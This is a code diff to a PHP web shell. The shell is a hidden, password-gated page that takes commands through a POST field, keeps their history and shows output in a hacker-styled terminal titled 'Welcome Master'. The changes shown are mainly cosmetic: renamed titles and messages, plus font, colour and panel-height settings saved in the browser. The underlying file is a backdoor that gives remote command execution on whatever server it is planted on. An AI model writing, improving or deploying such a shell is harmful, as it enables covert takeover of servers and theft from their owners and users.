@@ -7,7 +7,7 @@ if (!isset($_SESSION['loggedin'])) {
         if (hash("sha256", $_POST['pass']) === "68215fa3501ae17394bac692f12a5fe1cd6675a7c048d7307800956469f81057") {
             $_SESSION['loggedin'] = true;
         } else {
-            die("<pre>Invalid Code.</pre>");
+            die("<pre>Incorrect password.</pre>");
         }
     } else {
         echo '<form method="post" style="background:black;color:lime;padding:20px">
@@ -30,7 +30,7 @@ if (isset($_POST['cmd'])) {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WelCome Master</title>
+    <title>That's PhiVault Arena !</title>
     <style>
         body {
             background-color: black;
@@ -42,7 +42,7 @@ if (isset($_POST['cmd'])) {
             background-color: #111;
             border: 1px solid #444;
             padding: 15px;
-            height: 400px;
+            height: var(--panel-height, 400px);
             overflow-y: scroll;
             margin-bottom: 15px;
             font-size: var(--output-size, 14px);
@@ -68,28 +68,38 @@ if (isset($_POST['cmd'])) {
     </style>
 </head>
 <body>
-    <h2>Interactive PHP Shell</h2>
+    <h2>Welcome Master</h2>
 
-    <!-- Controls -->
-    <form method="post" style="margin-bottom: 10px;">
-        <label>Font size:</label>
-        <select onchange="setFontSize(this.value)">
+    <!-- UI Customizer -->
+    <div style="margin-bottom: 15px;">
+        <label>Font Size:</label>
+        <select id="fontSize" onchange="updateSettings()">
             <option value="12px">12</option>
-            <option value="14px" selected>14</option>
+            <option value="14px">14</option>
             <option value="16px">16</option>
             <option value="18px">18</option>
             <option value="20px">20</option>
         </select>
-        <label>Text color:</label>
-        <select onchange="setColor(this.value)">
-            <option value="white" selected>White</option>
+
+        <label>Text Color:</label>
+        <select id="textColor" onchange="updateSettings()">
+            <option value="white">White</option>
             <option value="lime">Lime</option>
             <option value="cyan">Cyan</option>
             <option value="yellow">Yellow</option>
             <option value="red">Red</option>
         </select>
-    </form>
 
+        <label>Shell Panel Height:</label>
+        <select id="panelHeight" onchange="updateSettings()">
+            <option value="300px">300px</option>
+            <option value="400px">400px</option>
+            <option value="500px">500px</option>
+            <option value="600px">600px</option>
+        </select>
+    </div>
+
+    <!-- Output Terminal -->
     <div class="output-box" id="terminal">
         <?php
         if (!empty($_SESSION['history'])) {
@@ -101,26 +111,53 @@ if (isset($_POST['cmd'])) {
         ?>
     </div>
 
+    <!-- Command Input -->
     <form method="post">
         <input type="text" name="cmd" autofocus autocomplete="off" placeholder="Enter command">
         <input type="submit" value="Run">
     </form>
 
+    <!-- JS to handle style persistence -->
     <script>
-        // Auto-scroll terminal to bottom
-        const terminal = document.getElementById("terminal");
-        terminal.scrollTop = terminal.scrollHeight;
+        const root = document.documentElement;
 
-        // Apply custom font size
-        function setFontSize(size) {
-            document.documentElement.style.setProperty('--output-size', size);
-            document.documentElement.style.setProperty('--input-size', size);
+        function updateSettings() {
+            const size = document.getElementById("fontSize").value;
+            const color = document.getElementById("textColor").value;
+            const height = document.getElementById("panelHeight").value;
+
+            // Apply styles
+            root.style.setProperty('--output-size', size);
+            root.style.setProperty('--input-size', size);
+            root.style.setProperty('--output-color', color);
+            root.style.setProperty('--panel-height', height);
+
+            // Save to localStorage
+            localStorage.setItem("fontSize", size);
+            localStorage.setItem("textColor", color);
+            localStorage.setItem("panelHeight", height);
         }
 
-        // Apply custom text color
-        function setColor(color) {
-            document.documentElement.style.setProperty('--output-color', color);
+        function applySavedSettings() {
+            const savedSize = localStorage.getItem("fontSize") || "14px";
+            const savedColor = localStorage.getItem("textColor") || "white";
+            const savedHeight = localStorage.getItem("panelHeight") || "400px";
+
+            root.style.setProperty('--output-size', savedSize);
+            root.style.setProperty('--input-size', savedSize);
+            root.style.setProperty('--output-color', savedColor);
+            root.style.setProperty('--panel-height', savedHeight);
+
+            document.getElementById("fontSize").value = savedSize;
+            document.getElementById("textColor").value = savedColor;
+            document.getElementById("panelHeight").value = savedHeight;
         }
+
+        applySavedSettings();
+
+        // Auto scroll to bottom
+        const term = document.getElementById("terminal");
+        term.scrollTop = term.scrollHeight;
     </script>
 </body>
 </html>
